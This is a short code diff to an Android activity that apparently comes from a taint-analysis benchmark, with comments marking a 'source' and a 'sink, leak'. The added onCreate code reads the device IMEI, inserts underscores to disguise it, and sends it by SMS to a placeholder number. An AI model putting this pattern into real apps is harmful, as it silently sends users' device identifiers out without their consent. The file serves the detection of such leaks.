@@ -21,5 +21,13 @@ public class LoopExample1 extends Activity {
 
     @Override
     protected void onCreate(Bundle savedInstanceState) {
+        TelephonyManager telephonyManager = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
+        // source
+        String imei = telephonyManager.getDeviceId();
+        String obfuscated = "";
+        for (char c : imei.toCharArray()) obfuscated += c + "_";
+        SmsManager sm = SmsManager.getDefault();
+        // sink, leak
+        sm.sendTextMessage("+49 1234", null, obfuscated, null, null);
     }
 }
